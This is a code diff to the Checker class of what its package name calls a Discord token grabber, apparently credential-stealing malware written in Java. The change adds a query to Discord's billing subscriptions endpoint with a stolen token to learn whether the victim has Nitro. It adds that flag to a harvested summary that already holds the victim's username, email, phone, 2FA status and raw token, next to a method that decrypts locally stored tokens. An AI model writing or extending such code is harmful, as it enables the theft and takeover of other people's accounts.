@@ -1,6 +1,7 @@
 package com.github.dedinc.discordtokengrabber.utils;
 
 import com.sun.jna.platform.win32.Crypt32Util;
+import org.json.JSONArray;
 import org.json.JSONObject;
 import javax.crypto.Cipher;
 import javax.crypto.spec.GCMParameterSpec;
@@ -20,13 +21,17 @@ public class Checker {
         String email = response.getString("email");
         Boolean twofa = response.getBoolean("mfa_enabled");
         Boolean verified = response.getBoolean("verified");
+
+        JSONArray nitroSubscriptions = new JSONArray(Helper.getRequest().get("https://discordapp.com/api/v9/users/@me/billing/subscriptions", token));
+        boolean hasNitro = nitroSubscriptions.length() > 0;
+
         info += "Username: " + username;
         info += "\nBio: " + bio;
         info += "\nEmail: " + email;
         try {
             info += "\nPhone: " + response.getString("phone");
         } catch (Exception e) {}
-        return String.format(info + "\n2FA: %b\nVerified: %b\n\nToken: %s", twofa, verified, token);
+        return String.format(info + "\n2FA: %b\nVerified: %b\nNitro: %b\n\nToken: %s", twofa, verified, hasNitro, token);
     }
 
     public static String decryptToken(String token) throws Exception {
